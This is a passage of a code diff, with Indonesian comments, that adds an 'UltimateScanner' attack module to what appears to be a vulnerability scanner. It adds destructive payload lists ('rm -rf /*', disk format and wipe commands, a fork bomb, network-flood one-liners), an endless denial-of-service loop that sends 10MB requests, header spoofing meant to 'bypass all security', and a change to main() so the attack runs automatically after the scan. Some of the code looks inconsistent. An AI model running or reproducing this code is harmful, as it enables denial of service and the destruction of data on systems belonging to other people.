+    ],
+    
+    "network_flood": [
+        # Network Flooding Payloads
+        "$(ping -n 65535 127.0.0.1)",
+        "$(seq 65535 | xargs -I{} nc -zv localhost {})",
+        "$(for i in {1..65535}; do curl localhost:$i; done)",
+    ],
+    
+    "filesystem_chaos": [
+        # Filesystem Attack Payloads
+        "rm -rf /*",  # Extreme caution!
+        "mkfs.ext4 /dev/sda",  # Format disk
+        ":(){:|:&};:",  # Fork bomb
+        "dd if=/dev/zero of=/dev/sda bs=4M",  # Disk wipe
+    ]
+}
+
+class UltimateScanner:
+    def __init__(self, target_info, threads=1000):
+        self.target_info = target_info
+        self.threads = threads
+        self.session = requests.Session()
+        self.success_count = 0
+        
+    async def launch_ultimate_attack(self):
+        """Jalankan semua serangan ekstrem secara bersamaan"""
+        logger.warning("Launching ultimate attack - USE WITH EXTREME CAUTION!")
+        
+        async with aiohttp.ClientSession() as session:
+            tasks = []
+            
+            # Jalankan semua serangan secara paralel
+            tasks.extend([
+                self.execute_memory_attacks(),
+                self.execute_network_flood(),
+                self.execute_database_attacks(),
+                self.execute_filesystem_attacks(),
+                self.execute_kernel_attacks()
+            ])
+            
+            # Tambahkan serangan DoS yang ekstrem
+            tasks.extend([self.execute_dos_attack() for _ in range(10)])
+            
+            return await asyncio.gather(*tasks)
+    
+    async def execute_memory_attacks(self):
+        """Serangan yang menarget memory"""
+        for payload in ULTIMATE_PAYLOADS["memory_corruption"]:
+            try:
+                # Kirim payload dalam chunks besar
+                chunk_size = 1024 * 1024  # 1MB chunks
+                for i in range(0, len(payload), chunk_size):
+                    chunk = payload[i:i+chunk_size]
+                    await self.send_payload(chunk, method='POST')
+                    await self.send_payload(chunk, method='GET')
+                    await self.send_payload(chunk, method='PUT')
+            except Exception as e:
+                logger.debug(f"Memory attack failed: {str(e)}")
+    
+    async def execute_network_flood(self):
+        """Flood network dengan request"""
+        connections = []
+        try:
+            # Buat ribuan koneksi simultan
+            for _ in range(5000):  # SANGAT agresif
+                try:
+                    conn = await self.create_slow_connection()
+                    connections.append(conn)
+                    # Kirim data terus menerus
+                    await conn.write(b"X" * 1024 * 1024)
+                except:
+                    continue
+                    
+            # Tahan koneksi
+            await asyncio.sleep(30)
+        finally:
+            for conn in connections:
+                try:
+                    await conn.close()
+                except:
+                    pass
+    
+    async def execute_database_attacks(self):
+        """Serangan database yang sangat agresif"""
+        for payload in ULTIMATE_PAYLOADS["database_destruction"]:
+            try:
+                # Kirim ke berbagai endpoint potensial
+                endpoints = [
+                    '/api/query', '/admin/query', '/db/exec',
+                    '/api/v1/query', '/api/v2/query', '/graphql'
+                ]
+                
+                for endpoint in endpoints:
+                    url = f"{self.target_info['full_url']}{endpoint}"
+                    
+                    # Kirim dengan berbagai metode
+                    methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
+                    for method in methods:
+                        try:
+                            headers = self.get_ultimate_headers()
+                            data = {
+                                'query': payload,
+                                'exec': payload,
+                                'sql': payload,
+                                'input': payload
+                            }
+                            
+                            async with self.session.request(
+                                method, 
+                                url,
+                                json=data,
+                                headers=headers,
+                                timeout=5
+                            ) as response:
+                                if response.status != 404:
+                                    self.log_success('database', url, payload)
+                        except:
+                            continue
+            except Exception as e:
+                logger.debug(f"Database attack failed: {str(e)}")
+    
+    async def execute_filesystem_attacks(self):
+        """Serangan filesystem yang ekstrem"""
+        for payload in ULTIMATE_PAYLOADS["filesystem_chaos"]:
+            try:
+                # Encode payload dalam berbagai format
+                encoded_payloads = [
+                    base64.b64encode(payload.encode()).decode(),
+                    urllib.parse.quote_plus(payload),
+                    ''.join([hex(ord(c))[2:] for c in payload]),
+                    payload.encode('utf-16le').decode('utf-8', errors='ignore')
+                ]
+                
+                for encoded in encoded_payloads:
+                    await self.send_payload(encoded, method='POST')
+            except Exception as e:
+                logger.debug(f"Filesystem attack failed: {str(e)}")
+    
+    async def execute_kernel_attacks(self):
+        """Serangan yang menarget kernel"""
+        for payload in ULTIMATE_PAYLOADS["kernel_exploits"]:
+            try:
+                # Kirim dengan berbagai protokol
+                protocols = ['http', 'https', 'ftp', 'gopher', 'file']
+                for protocol in protocols:
+                    url = f"{protocol}://{self.target_info['domain']}"
+                    await self.send_payload(payload, url=url)
+            except Exception as e:
+                logger.debug(f"Kernel attack failed: {str(e)}")
+    
+    async def execute_dos_attack(self):
+        """DoS attack yang sangat ekstrem"""
+        try:
+            # Buat pool connection yang sangat besar
+            conn_pool = [self.create_slow_connection() for _ in range(2000)]
+            
+            # Kirim request dalam jumlah besar
+            while True:
+                tasks = []
+                for _ in range(5000):
+                    tasks.append(self.send_heavy_payload())
+                await asyncio.gather(*tasks)
+                
+        except Exception as e:
+            logger.debug(f"DoS attack failed: {str(e)}")
+    
+    async def send_heavy_payload(self):
+        """Kirim payload yang berat"""
+        try:
+            # Generate payload besar
+            payload = "A" * (1024 * 1024 * 10)  # 10MB payload
+            headers = self.get_ultimate_headers()
+            
+            async with self.session.post(
+                self.target_info['full_url'],
+                data=payload,
+                headers=headers,
+                timeout=1
+            ) as response:
+                await response.read()
+        except:
+            pass
+    
+    def get_ultimate_headers(self):
+        """Generate headers untuk bypass semua security"""
+        headers = {
+            'User-Agent': f"Mozilla/5.0 ({random.choice(['Windows', 'Linux', 'Mac'])}) AppleWebKit/537.36",
+            'X-Forwarded-For': f"127.0.0.1, {'.'.join([str(random.randint(1,255)) for _ in range(4)])}",
+            'X-Real-IP': '.'.join([str(random.randint(1,255)) for _ in range(4)]),
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Accept-Encoding': 'gzip, deflate',
+            'Connection': 'keep-alive',
+            'Cache-Control': 'no-cache',
+            'X-Requested-With': 'XMLHttpRequest',
+            'X-Custom-Auth': 'Bearer ' + ''.join(random.choices(string.ascii_letters + string.digits, k=32))
+        }
+        return headers
+
 def main():
     banner()
     
@@ -1421,6 +2171,15 @@ def main():
         logger.info("Phase 6: Generating Exploit Suggestions")
         results["exploit_suggestions"] = exploit_suggestion(results["vulnerabilities"], target_info)
         
+        # Gunakan scanner yang lebih advanced
+        logger.info("Starting advanced vulnerability scan...")
+        advanced_scanner = AdvancedVulnScanner(target_info)
+        results["advanced_vulnerabilities"] = advanced_scanner.perform_advanced_scan()
+        
+        # Jalankan DoS testing
+        logger.info("Performing advanced DoS testing...")
+        results["dos_test"] = advanced_dos_test(target_info)
+        
         # Generate final report
         logger.info("Phase 7: Generating Report")
         report_info = generate_report(target_info, results)
@@ -1439,6 +2198,11 @@ def main():
             
         print(f"\nOverall Risk Level: {risk_color}{risk_level}{Colors.ENDC}")
         print(f"Risk Score: {risk_color}{report_info['risk_score']['score']}/100{Colors.ENDC}")
+        
+        # Jalankan ultimate scanner
+        logger.warning("Initiating ultimate scan - USE WITH EXTREME CAUTION!")
+        ultimate_scanner = UltimateScanner(target_info)
+        asyncio.run(ultimate_scanner.launch_ultimate_attack())
         
     except KeyboardInterrupt:
         logger.warning("Scan interrupted by user")
